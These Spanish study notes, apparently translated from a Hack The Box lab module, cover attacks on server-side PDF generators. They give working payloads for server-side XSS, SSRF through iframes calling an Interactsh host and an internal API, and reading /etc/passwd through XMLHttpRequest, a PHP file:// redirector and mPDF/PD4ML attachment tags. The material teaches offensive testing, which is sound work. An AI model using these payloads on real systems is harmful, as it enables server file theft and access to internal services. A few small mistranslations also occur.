---
tags:
  - Pentesting/Vulnerabilidad
  - Pentesting/Explotacion
  - Web/Red-Team
Fecha de actualización: 2025-10-27
Nota previa: "[[Vulnerabilidades de generación de PDF]]"
Nota siguiente: "[[Prevención de vulnerabilidades en la generación de PDF]]"
Area: "[[Vulnerabilidades de generación de PDF]]"
---
---

# Ejecución de código JavaScript
El primer exploit que exploraremos es la inyección de código *JavaScript*, ya que la **ejecución del código *JavaScript* inyectado permite más vectores de ataque**. Debido a que la biblioteca de generación de *PDF* representa la entrada *HTML*, podría ejecutar nuestro código *JavaScript* inyectado. Además, <mark style="background: #ADCCFFA6;">con la biblioteca de generación de *PDF* ejecutándose en el servidor, el payload también se ejecutaría en el servidor</mark>, por lo que este tipo de vulnerabilidad también se denomina [[Cross-Site Scripting (XSS)|Server-Side XSS]].

Para demostrar `Server-Side XSS` echemos un vistazo a un ejemplo de aplicación web para tomar notas. Al hacer clic en el icono de la impresora, la aplicación web genera un *PDF* imprimible que contiene todas nuestras notas:
![Tres tarjetas de texto: colores predeterminado, azul claro y ámbar, cada una con texto lorem ipsum. Vista en miniatura a la izquierda.](https://academy.hackthebox.com/storage/modules/204/pdf_js_2.png)

Dado que todo lo que requiere el ataque es la capacidad de inyectar código *HTML*, <mark style="background: #FFB8EBA6;">probaremos si la biblioteca de generación de *PDF* interpreta el código *HTML* que proporcionamos</mark>. Primero, crearemos una nueva nota con un simple `bold tag` que contiene nuestro payload *HTML*:
![Tarjeta con texto en negrita 'test1' y 'test2', elimine el ícono e imprima y agregue los íconos a continuación.](https://academy.hackthebox.com/storage/modules/204/pdf_js_3.png)

Dado que <mark style="background: #FF5582A6;">la aplicación web escapa correctamente del payload HTML, el texto entre las etiquetas no aparece en negrita</mark>. De esta forma, la **aplicación web es segura contra los ataques *XSS* clásicos**. Sin embargo, si generamos un *PDF*, podemos ver que el texto entre las etiquetas se ha vuelto en negrita en el cuerpo de la nota, <mark style="background: #FFB86CA6;">lo que indica que la biblioteca de generación de *PDF* es vulnerable a la inyección de *HTML* y potencialmente a *XSS* del lado del servidor</mark>:
![Tarjeta con texto 'test1' y negrita 'test2'.](https://academy.hackthebox.com/storage/modules/204/pdf_js_4.png)

En el segundo paso, debemos verificar si el servidor ejecuta el código *JavaScript* inyectado. Podemos utilizar un payload similar al siguiente:
```javascript
<script>document.write('test1')</script>
```

Después de generar un *PDF*, podemos ver la cadena `test1` en el *PDF*. Por lo tanto, **el back-end ejecutó nuestro código *JavaScript* inyectado y escribió la cadena en el *DOM* antes de generar el *PDF***.
![Tarjeta con texto 'XSS-Test' y 'test1', seguida de una línea horizontal.](https://academy.hackthebox.com/storage/modules/204/pdf_js_5.png)

Como primer exploit simple, forcemos una divulgación de información que filtre una ruta en el servidor web. Podemos hacerlo con el siguiente payload:
```javascript
<script>document.write(window.location)</script>
```

La propiedad [ventana.ubicación](https://developer.mozilla.org/en-US/docs/Web/API/Window/location) **almacena la ubicación actual del contexto de *JavaScript***. Dado que se trata de un archivo local en el sistema de archivos del servidor, <mark style="background: #FFB86CA6;">muestra la ruta local en el servidor donde se almacenan los archivos *PDF* generados</mark>:
![Tarjeta con texto 'XSS' y ruta de archivo 'file:///var/www/html/secretfolder/tmp_wkhtmlto_pdf_3CxtnJ.html'.](https://academy.hackthebox.com/storage/modules/204/pdf_js_6.png)

---

# Falsificación de solicitudes del lado del servidor
Una de las vulnerabilidades más comunes en combinación con la generación de PDF es [Falsificación de solicitudes del lado del servidor (SSRF)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery). Dado que los documentos HTML comúnmente cargan recursos como hojas de estilo o imágenes de fuentes externas, mostrar un documento HTML requiere inherentemente que el servidor envíe solicitudes a estas fuentes externas para obtenerlas. Dado que podemos inyectar código HTML arbitrario en la entrada del generador de PDF, podemos obligar al servidor a enviar dicha solicitud GET a cualquier URL que elijamos, incluidas las aplicaciones web internas.

Podemos inyectar muchas etiquetas *HTML* diferentes para obligar al servidor a enviar una solicitud *HTTP*. Por ejemplo, podemos inyectar una etiqueta de imagen que apunte a una *URL* bajo nuestro control para confirmar *SSRF*. Como ejemplo, vamos a utilizar el `img` etiqueta con un dominio de [Interactuar](https://app.interactsh.com/):
```html
<img src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest1"/>
```

De manera similar, también podemos inyectar una hoja de estilo usando el `link` etiqueta:
```html
<link rel="stylesheet" href="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest2" >
```

Generalmente, para imágenes y hojas de estilo, la respuesta no se muestra en el PDF generado, de modo que tenemos una `blind SSRF` vulnerabilidad que restringe nuestra capacidad para explotarla. Sin embargo, dependiendo de la (mala) configuración de la biblioteca de generación de PDF, podemos inyectar otros elementos HTML que pueden activar una solicitud y hacer que el servidor muestre la respuesta. Un ejemplo de esto es un `iframe`:
```html
<iframe src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest3"></iframe>
```

Inyectar las tres cargas útiles y generar un PDF da como resultado tres solicitudes a nuestro `Interactsh` dominios, de modo que confirmamos con éxito SSRF con los tres payloads:
![Tabla con solicitudes HTTP y DNS recientes, las entradas resaltadas muestran solicitudes HTTP de hace 1 minuto. Detalles de una solicitud GET y una respuesta 200 OK a la derecha.](https://academy.hackthebox.com/storage/modules/204/pdfssrf_1.png)

Además, al observar el PDF generado, podemos ver que el iframe inyectado contiene la respuesta HTTP enviada por `Interactsh`:
![Tarjeta con texto 'SSRF-Test' y un cuadro de texto desplazable que contiene una cadena.](https://academy.hackthebox.com/storage/modules/204/pdfssrf_2.png)

Por lo tanto, no tenemos una vulnerabilidad SSRF ciega sino una SSRF regular, que es significativamente más grave ya que nos permite exfiltrar datos más fácilmente. Por ejemplo, podemos realizar una solicitud a cualquier punto final interno y obtener la respuesta que se nos muestra. A modo de ejemplo, podemos filtrar datos de una API interna de la siguiente manera:
```html
<iframe src="http://127.0.0.1:8080/api/users" width="800" height="500"></iframe>
```

El PDF generado contiene la respuesta de la API interna, lo que potencialmente nos revela información confidencial a la que no podemos acceder externamente:
![Tarjeta con texto 'SSRF-Exploit' y una matriz JSON que muestra nombres de usuario y contraseñas en hash.](https://academy.hackthebox.com/storage/modules/204/pdfssrf_3.png)

Para obtener más detalles sobre la explotación de SSRF, consulte el [Módulo de ataques del lado del servidor](https://academy.hackthebox.com/module/details/145).

---

# Inclusión de archivos locales
Otra vulnerabilidad poderosa que potencialmente podemos explotar con la ayuda de bibliotecas de generación de PDF es `Local File Inclusion` (`LFI`). Hay varios elementos HTML que podemos intentar inyectar para leer archivos locales en el servidor.

## Con ejecución de JavaScript
Si el servidor ejecuta nuestro JavaScript inyectado, podemos leer archivos locales usando [Solicitudes XmlHttp](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) y el `file` protocolo, lo que da como resultado una carga útil similar a la siguiente:
```html
<script>
	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(this.responseText)
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```

Inyectando este código JavaScript, podemos ver el contenido del `passwd` archivo en el PDF generado:
![Bloque de texto que muestra información y rutas del usuario del sistema.](https://academy.hackthebox.com/storage/modules/204/pdflfi_1.png)

Sin embargo, esto no es práctico para algunos archivos, ya que copiar datos del archivo PDF podría romperlo. Por ejemplo, lo más probable es que la sintaxis se rompa si exfiltramos una clave SSH. Además, no podemos exfiltrar archivos que contengan datos binarios de esta manera. Por lo tanto, debemos codificar el archivo en base64 utilizando `btoa` función antes de escribirla en el PDF:
```html
<script>
	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(btoa(this.responseText))
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```

Sin embargo, al hacerlo se crea una única línea larga que no cabe en la página PDF. Normalmente, la biblioteca de generación de PDF no inyectará saltos de línea, lo que provocará que la línea se trunque antes del final de la página:
![Bloque de texto que muestra una cadena codificada larga.](https://academy.hackthebox.com/storage/modules/204/pdflfi_2.png)

Podemos modificar fácilmente nuestra carga útil para inyectar saltos de línea cada 100 caracteres para garantizar que encaje en la página PDF:
```html
<script>
	function addNewlines(str) {
		var result = '';
		while (str.length > 0) {
		    result += str.substring(0, 100) + '\n';
			str = str.substring(100);
		}
		return result;
	}

	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(addNewlines(btoa(this.responseText)))
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```

Después de hacerlo, finalmente podremos recuperar el archivo sin problemas. Ahora podemos copiar los datos codificados en base64 y decodificarlos usando cualquier herramienta que ignore los saltos de línea en la entrada codificada en base64, como por ejemplo [Ciberchef](https://gchq.github.io/CyberChef/):
![Bloque de texto que muestra una cadena codificada larga.](https://academy.hackthebox.com/storage/modules/204/pdflfi_3.png)

## Sin ejecución de JavaScript
Si el backend no ejecuta nuestro código JavaScript inyectado, debemos usar otras etiquetas HTML para mostrar archivos locales. Podemos probar las siguientes cargas útiles:
```html
<iframe src="file:///etc/passwd" width="800" height="500"></iframe>
<object data="file:///etc/passwd" width="800" height="500">
<portal src="file:///etc/passwd" width="800" height="500">
```

Sin embargo, al hacerlo en nuestro entorno de prueba solo se muestra un iframe vacío:
![Tarjeta con texto 'LFI' y un cuadro de texto vacío.](https://academy.hackthebox.com/storage/modules/204/pdflfi_4.png)

Afortunadamente, hay un truco más que podemos hacer en combinación con iframes. Como se discutió anteriormente en el `SSRF` En esta sección, algunas bibliotecas de generación de PDF muestran la respuesta a las solicitudes en iframes. Sin embargo, como podemos ver en la captura de pantalla anterior, a veces no podemos usar iframes para acceder a los archivos directamente. Sin embargo, podemos utilizar un `src` atributo que apunta a un servidor bajo nuestro control y redirige las solicitudes entrantes a un archivo local. Si la biblioteca está mal configurada, es posible que muestre el archivo. Podemos ejecutar el siguiente script PHP en nuestro servidor para hacerlo. El script responde a todas las solicitudes entrantes con una redirección HTTP 302 configurando el `Location` encabezado a un archivo local usando el `file` protocol:
```php
<?php header('Location: file://' . $_GET['url']); ?>
```

Luego podemos inyectar la siguiente carga útil, donde la IP apunta al servidor en el que estamos ejecutando el script redirector:
```html
<iframe src="http://172.17.0.1:8000/redirector.php?url=%2fetc%2fpasswd" width="800" height="500"></iframe>
```

Después de hacerlo, el PDF generado ahora contiene el archivo filtrado:
![Tarjeta con texto 'Redirigir LFI' y una lista de información y rutas del usuario del sistema.](https://academy.hackthebox.com/storage/modules/204/pdflfi_5.png)

Para obtener más detalles sobre la explotación de LFI, consulte el [Módulo de inclusión de archivos](https://academy.hackthebox.com/module/details/23).

## Anotaciones
Si bien ya hemos discutido cómo incluir archivos locales en las páginas PDF, los archivos PDF admiten funciones avanzadas como `annotations` y `attachments`, que también podemos utilizar para filtrar archivos locales en el servidor. Esto es particularmente interesante si las cargas útiles analizadas anteriormente no funcionan.

Por ejemplo, considere la biblioteca de generación de PDF `mPDF`, que admite anotaciones a través de `<annotations>` tag. Podemos usar anotaciones para agregar archivos al archivo PDF generado inyectando una carga útil como la siguiente:
```html
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="LFI" />
```

Mirando el archivo PDF generado, podemos ver la anotación con el archivo adjunto. Al hacer clic en el archivo adjunto se revela el archivo adjunto `/etc/passwd` fișier:
![Tarjeta con texto 'Anotación LFI' y un pequeño icono.](https://academy.hackthebox.com/storage/modules/204/pdfattachment_1.png)

Como podemos ver en esto [Problema de GitHub](https://github.com/mpdf/mpdf/issues/356), las anotaciones se han deshabilitado después `mPDF 6.0`. Por lo tanto, las aplicaciones web que utilizan una versión obsoleta de mPDF probablemente sean vulnerables a esto. La opción aún se puede habilitar en versiones más nuevas de mPDF, por lo que también vale la pena probar aplicaciones web utilizando versiones actualizadas de mPDF.

Otra biblioteca de generación de PDF que admite archivos adjuntos es `PD4ML`. Podemos comprobar la sintaxis en el [documentación](https://pd4ml.tech/support-topics/usage-examples/#add-attachment). Como prueba de concepto, podemos utilizar la siguiente carga útil:
```html
<pd4ml:attachment src="/etc/passwd" description="LFI" icon="Paperclip"/>
```

Nuevamente, si miramos el archivo PDF generado, podemos ver la anotación con el archivo adjunto:
![Tarjeta con texto 'Anotación LFI' y un icono, rodeada por texto 'MODO DEMO PD4ML' en los laterales.](https://academy.hackthebox.com/storage/modules/204/pdfattachments_2.png)

Como antes, el archivo se revela si hacemos clic en la anotación. Como podemos ver, es esencial leer la documentación de la biblioteca de generación de PDF específica utilizada por nuestra aplicación web de destino para ver si podemos identificar alguna funcionalidad que potencialmente podamos explotar. Etiquetas personalizadas como `pd4ml:attachment` que permiten el acceso a archivos locales son particularmente interesantes.